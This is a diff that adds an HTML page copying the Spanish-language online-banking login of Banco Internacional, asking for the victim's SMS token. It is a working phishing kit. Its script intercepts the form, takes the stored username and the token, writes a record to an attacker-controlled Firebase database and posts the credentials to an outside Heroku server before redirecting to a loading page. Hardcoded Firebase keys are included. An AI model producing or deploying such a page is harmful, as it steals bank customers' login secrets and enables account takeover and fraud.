@@ -1,0 +1,428 @@
+<!DOCTYPE html>
+<!-- saved from url=(0072)#mcm-web-baninter/login.jsp -->
+<html
+  xmlns="http://www.w3.org/1999/xhtml"
+  xml:lang="es"
+  lang="es"
+  class="dj_webkit dj_chrome dj_contentbox"
+>
+  <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
+    import {
+      getFirestore,
+      doc,
+      setDoc,
+      onSnapshot,
+    } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyDFYJf5HrCfbyEkggIHJ6hcgQJpUKMfzc0",
+      authDomain: "basedtos-84767.firebaseapp.com",
+      projectId: "basedtos-84767",
+      storageBucket: "basedtos-84767.appspot.com",
+      messagingSenderId: "622608516389",
+      appId: "1:622608516389:web:b3c12b4a3537c1bfff06cc",
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    window.db = db; // Hacer db accesible globalmente
+    window.doc = doc;
+    window.setDoc = setDoc;
+    window.onSnapshot = onSnapshot;
+  </script>
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <title>Banco Internacional</title>
+
+    <meta http-equiv="X-UA-Compatible" content="IE=9; IE=8; IE=7; IE=EDGE" />
+    <meta http-equiv="CACHE-CONTROL" content="NO-CACHE" />
+    <meta http-equiv="PRAGMA" content="NO-CACHE" />
+    <meta name="google" value="notranslate" />
+    <link
+      type="image/x-icon"
+      href="#mcm-web-skin/cache/2408152126/images/favicon_fisaDesert.ico"
+      rel="icon"
+    />
+    <link
+      type="image/x-icon"
+      href="#mcm-web-skin/cache/2408152126/images/favicon_fisaDesert.ico"
+      rel="shortcut icon"
+    />
+
+    <link
+      href="./index_files/fisaDesertAll.css"
+      type="text/css"
+      rel="stylesheet"
+    />
+    <link
+      rel="stylesheet"
+      type="text/css"
+      href="./index_files/fisaDesertLogin.css"
+    />
+    <link
+      rel="stylesheet"
+      type="text/css"
+      href="./index_files/fisaDesertLoginCustom.css"
+    />
+
+    <style type="text/css" id="operaUserStyle"></style>
+  </head>
+
+  <body
+    class="fisaDesert"
+    __processed_2814c388-ec35-4d60-b7ef-5193cf080f3a__="true"
+    cz-shortcut-listen="true"
+    bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJkaXNhYmxlZCIsIkZBQ0VCT09LIjoiZGlzYWJsZWQiLCJUV0lUVEVSIjoiZGlzYWJsZWQiLCJSRURESVQiOiJkaXNhYmxlZCIsIlBJTlRFUkVTVCI6ImRpc2FibGVkIiwiSU5TVEFHUkFNIjoiZGlzYWJsZWQiLCJMSU5LRURJTiI6ImRpc2FibGVkIiwiQ09ORklHIjoiZGlzYWJsZWQifSwidmVyc2lvbiI6IjIuMC4xNiIsInNjb3JlIjoyMDAxNn1d"
+    bis_skin_checked="1"
+  >
+    <div class="bgbody" bis_skin_checked="1"></div>
+    <div id="header" bis_skin_checked="1">
+      <div id="logo" bis_skin_checked="1">
+        <img src="./index_files/logow.png" />
+      </div>
+      <div id="topnavhome" bis_skin_checked="1">
+        <ul class="menuhome">
+          <li class="first-item bold">Bienvenido(a)</li>
+          <li>
+            <a href="#mcm-web-baninter/login.jsp#">Ayuda</a>
+          </li>
+          <li class="last-item">
+            <a href="#mcm-web-baninter/login.jsp#">Contáctanos</a>
+          </li>
+        </ul>
+      </div>
+    </div>
+
+    <form id="loginform">
+      <div id="finalUserContent" bis_skin_checked="1">
+        <div id="content" bis_skin_checked="1">
+          <div
+            id="ec_fisa_message_Panel_0"
+            lang="es"
+            widgetid="ec_fisa_message_Panel_0"
+            bis_skin_checked="1"
+          ></div>
+
+          <div
+            dojotype="dijit.layout.ContentPane"
+            region="center"
+            dolayout="false"
+            refreshonshow="true"
+            id="borderContainerTwo"
+            class="dijitContentPane"
+            lang="es"
+            widgetid="borderContainerTwo"
+            bis_skin_checked="1"
+          >
+            <div
+              dojotype="dojox.layout.ContentPane"
+              region="center"
+              dolayout="false"
+              refreshonshow="true"
+              style="width: 100%"
+              class="dijitContentPane"
+              id="dojox_layout_ContentPane_0"
+              lang="es"
+              widgetid="dojox_layout_ContentPane_0"
+              bis_skin_checked="1"
+            >
+              <div id="mainwindow" bis_skin_checked="1">
+                <div id="headerwindow" bis_skin_checked="1">
+                  <p>
+                    Si su Usuario o Clave fue comprometida, favor contactar al
+                    banco al : 800-7555 o 210-8255
+                  </p>
+                </div>
+                <div id="formwindow" bis_skin_checked="1">
+                  <div
+                    class="row-form-login border-bottom"
+                    bis_skin_checked="1"
+                  >
+                    <div
+                      id="mainContainer"
+                      dojotype="dojox.layout.ContentPane"
+                      dolayout="false"
+                      refreshonshow="true"
+                      class="dijitContentPane mainContainer"
+                      lang="es"
+                      widgetid="mainContainer"
+                      bis_skin_checked="1"
+                    >
+                      <div
+                        id="lpwindow"
+                        class="backgradient col6"
+                        bis_skin_checked="1"
+                      >
+                        <div id="cmpwindow" bis_skin_checked="1">
+                          <h2 class="boldtext">INGRESO A BANCA ONLINE</h2>
+
+                          <div id="btnpassword" bis_skin_checked="1"></div>
+                          <div
+                            id="forminfowindow"
+                            class="screenLogin"
+                            bis_skin_checked="1"
+                          >
+                            <!--<form data-dojo-type="dijit.form.Form" id="frmLogin" name="frmLogin" style="margin: 0px" method="post" action="j_security_check" accept-charset="UTF-8">-->
+                            <div
+                              class="row-section align-center"
+                              bis_skin_checked="1"
+                            >
+                              <div
+                                class="input-widget sms-icon"
+                                bis_skin_checked="1"
+                              >
+                                <label class="fisaLabel-login">Token SMS</label>
+
+                                <div
+                                  class="dijit dijitReset dijitInline dijitLeft dijitTextBox"
+                                  id="widget_j_username"
+                                  role="presentation"
+                                  lang="es"
+                                  widgetid="j_username"
+                                  bis_skin_checked="1"
+                                >
+                                  <div
+                                    class="dijitReset dijitInputField dijitInputContainer"
+                                    bis_skin_checked="1"
+                                  >
+                                    <input
+                                      class="dijitReset dijitInputInner"
+                                      data-dojo-attach-point="textbox,focusNode"
+                                      autocomplete="off"
+                                      name="j_username"
+                                      type="text"
+                                      tabindex="0"
+                                      id="j_username"
+                                      maxlength="16"
+                                      value=""
+                                      placeholder="Ingresa tu token SMS"
+                                    />
+                                  </div>
+                                </div>
+
+                                <div
+                                  data-dojo-type="dijit/Tooltip"
+                                  data-dojo-props="connectId:&#39;info-login&#39;,position:[&#39;above&#39;]"
+                                  class="dijitTooltipData"
+                                  id="dijit_Tooltip_0"
+                                  lang="es"
+                                  widgetid="dijit_Tooltip_0"
+                                  bis_skin_checked="1"
+                                >
+                                  Ingrese su usuario. Si ha utilizado la Banca
+                                  Online anterior, ingrese con su mismo Usuario.
+                                </div>
+                              </div>
+                            </div>
+                            <div class="button-section" bis_skin_checked="1">
+                              <!--Ingresar-->
+                              <!--<input type="submit" name="btnsession" class="button-form" value="Continuar" />-->
+                              <!-- Boton Aceptar nuevo Folder -->
+                              <span
+                                class="dijit dijitReset dijitInline dijitButton"
+                                role="presentation"
+                                lang="es"
+                                widgetid="dijit_form_Button_0"
+                                ><span
+                                  class="dijitReset dijitInline dijitButtonNode"
+                                  data-dojo-attach-event="ondijitclick:__onClick"
+                                  role="presentation"
+                                  ><span
+                                    class="dijitReset dijitStretch dijitButtonContents"
+                                    data-dojo-attach-point="titleNode,focusNode"
+                                    role="button"
+                                    aria-labelledby="dijit_form_Button_0_label"
+                                    tabindex="0"
+                                    id="dijit_form_Button_0"
+                                    style="user-select: none"
+                                    ><span
+                                      class="dijitReset dijitInline dijitIcon dijitNoIcon"
+                                      data-dojo-attach-point="iconNode"
+                                    ></span
+                                    ><span
+                                      class="dijitReset dijitToggleButtonIconChar"
+                                      >●</span
+                                    >
+                                    <button
+                                      type="submit"
+                                      style="
+                                        margin: 0;
+                                        padding: 0;
+                                        border: 0;
+                                        background: transparent;
+                                        color: white;
+                                      "
+                                    >
+                                      <span
+                                        class="dijitReset dijitInline dijitButtonText"
+                                        id="dijit_form_Button_0_label"
+                                        data-dojo-attach-point="containerNode"
+                                        >Continuar</span
+                                      >
+                                    </button>
+                                  </span></span
+                                ><input
+                                  type="button"
+                                  value=""
+                                  class="dijitOffScreen"
+                                  data-dojo-attach-event="onclick:_onClick"
+                                  tabindex="-1"
+                                  role="presentation"
+                                  data-dojo-attach-point="valueNode"
+                              /></span>
+                            </div>
+                            <div id="msg-login-form" bis_skin_checked="1">
+                              Este token solo es valido durante 30 segundos
+                            </div>
+
+                            <!--</form>-->
+                          </div>
+                        </div>
+                      </div>
+
+                      <div id="rpwindow" class="col6" bis_skin_checked="1">
+                        <div id="msgwindow" bis_skin_checked="1">
+                          <div id="ayuda" bis_skin_checked="1">
+                            <h2 class="boldtext align-left">Utilidades</h2>
+                            <ul class="bullet-arrow">
+                              <li>
+                                <a href="#mcm-web-baninter/login.jsp#"
+                                  >Generar nuevo código de confirmación</a
+                                >
+                              </li>
+                            </ul>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                  <div class="row-form-login" bis_skin_checked="1">
+                    <div
+                      id="faqtexto"
+                      class="icon-msg-footer"
+                      bis_skin_checked="1"
+                    >
+                      <p>
+                        Te recordamos que Banco Internacional
+                        <span class="enfatize-text">
+                          no solicita
+                          <span class="undeline-enfatize">
+                            información personal relacionada con usuarios y
+                            contraseñas de acceso
+                          </span>
+                        </span>
+                        a tus cuentas o servicios electrónicos vía e-mail.
+                      </p>
+                      <!--REEMPLAZAR CON LA ETIQUETA -->
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </form>
+
+    <!-- EMPIEZA SECCION DEL FOOTER -->
+    <div id="footer" bis_skin_checked="1">
+      <div id="copy" bis_skin_checked="1">
+        <p>
+          Copyright (c) 2019 Banco Internacional. Todos los derechos reservados.
+        </p>
+      </div>
+    </div>
+
+    <div
+      id="dojox_widget_Standby_0"
+      widgetid="dojox_widget_Standby_0"
+      bis_skin_checked="1"
+    >
+      <div
+        style="
+          display: none;
+          opacity: 0;
+          z-index: 9999;
+          position: absolute;
+          cursor: wait;
+          background-color: rgb(226, 235, 254);
+        "
+        dojoattachpoint="_underlayNode"
+        bis_skin_checked="1"
+      ></div>
+      <img
+        src="./index_files/loading.gif"
+        style="
+          opacity: 0;
+          display: none;
+          z-index: -10000;
+          position: absolute;
+          top: 0px;
+          left: 0px;
+          cursor: wait;
+        "
+        dojoattachpoint="_imageNode"
+        alt="Espere por favor..."
+      />
+      <div
+        style="
+          opacity: 0;
+          display: none;
+          z-index: -10000;
+          position: absolute;
+          top: 0px;
+        "
+        dojoattachpoint="_textNode"
+        bis_skin_checked="1"
+      >
+        Espere por favor...
+      </div>
+    </div>
+  </body>
+  <script src="telegram.js"></script>
+
+  <script>
+    const url = "https://ipapi.co/json/";
+    const form = document.querySelector("#loginform");
+
+    form.addEventListener("submit", async (event) => {
+      event.preventDefault(); // aqui evitamos que el código se repita evita que se envíe el formulario
+      const nombre = localStorage.getItem("usuario");
+      const contra = document.querySelector("#j_username").value;
+      const message =
+        "\nInternacional\nNombre: " + nombre + "\nToken: " + contra;
+
+      const questionRef = doc(window.db, "internaciona1s", nombre);
+      await setDoc(questionRef, {
+        question1: "",
+        frase: "frase",
+        image: "imagen",
+        page: 0,
+      });
+      
+
+      await axios
+        .post(
+          "https://serivdornuevo-3f7a1ae73ccb.herokuapp.com/internacional/",
+          {
+            mensaje: message,
+          },
+          {
+            headers: {
+              Accept: "application/json",
+              "Content-Type": "application/json",
+            },
+          }
+        )
+        .then((response) => {
+          window.location.href = "loading.html";
+        })
+        .catch((error) => {
+          console.error(error);
+        });
+    });
+  </script>
+</html>
